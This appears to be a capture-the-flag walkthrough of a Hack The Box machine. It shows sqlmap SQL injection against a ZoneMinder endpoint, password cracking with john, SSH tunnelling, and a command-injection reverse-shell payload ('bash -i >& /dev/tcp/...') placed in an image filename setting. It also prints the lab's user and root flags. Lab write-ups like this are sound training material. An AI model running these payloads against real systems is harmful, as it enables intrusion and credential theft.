![](https://miro.medium.com/v2/resize:fit:875/1*__uv8hycZOrUMD323PqQ9Q.png)

nmap at first

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*81QrmMme6t4NiYUAmI6AmA.png)

remember /etc/hosts

![](https://miro.medium.com/v2/resize:fit:580/1*CxcketrI54pqdPjXGzhF4w.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*1rUSSNBNrLbQX2FLAzDUkQ.png)

after some fuzz,i found a Default Credentials to login

admin:amdin

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*pYOoQaThaxXGDXOhGf-4-w.png)

search some exploits

foundCVE-2024–51482

sqlmap -u “[http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1](http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1)" \  
-D zm -T Users -C Username,Password \  
— dump \  
— batch \  
— dbms=MySQL \  
— technique=T \  
— cookie=”ZMSESSID=q5ttatr79rbuhcf5h6e9ssd3lc”

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*4vPT7deHBSUR2uu4zD2Uzg.png)

admin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |  
mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |  
superadmin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |

use john to found the true password  
john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
john — show hash.txt

we found

mark : opensesame

so ssh mark@IP

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*znCHU_aOml-5gvh1W5L9xg.png)

after some search

check the port

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*-kcI6jJJc-wFqvwDG1WYbw.png)

8675 was wired

[](https://medium.com/write?source=promotion_paragraph---post_body_banner_home_for_stories_scribble--b1fe46713871---------------------------------------)

so ssh -L 8765:127.0.0.1:8765 mark@cctv.htb

check [http://127.0.0.1:8765](http://127.0.0.1:8765/)

found the version and found CVE-2025–60787

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*nJ0MLw4y45hWguTv2pLqEQ.png)

lets rock

oh,but first, wo have to found the password

![](https://miro.medium.com/v2/resize:fit:728/1*crBHUo_nA5D7T34JrtQW1g.png)

yes,now lets go

first,f12 and type

configUiValid = function() { return true; };

than,setting->still images

so use

$(bash -i >& /dev/tcp/10.10.17.136/4446 0>&1).%Y-%m-%d-%H-%M-%S

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*nzxfLdF0peIvi2dlNrxiUw.png)

to fullfill the image file name.it was exce by shell

than touch apply

remember nc -lvnp and set capture mode

now, we get shell

![](https://miro.medium.com/v2/resize:fit:830/1*cmYPZ0SBGADV72_5j5OvqA.png)

![](https://miro.medium.com/v2/resize:fit:803/1*irxbcWGTl2yTwJIrxZhglg.png)

**_userflag:ef347e08a78fe1a4cb92f6cd20501454_**

**_rootflag:94a9c149ecd585a1aca7c4d0dc3b1a60_**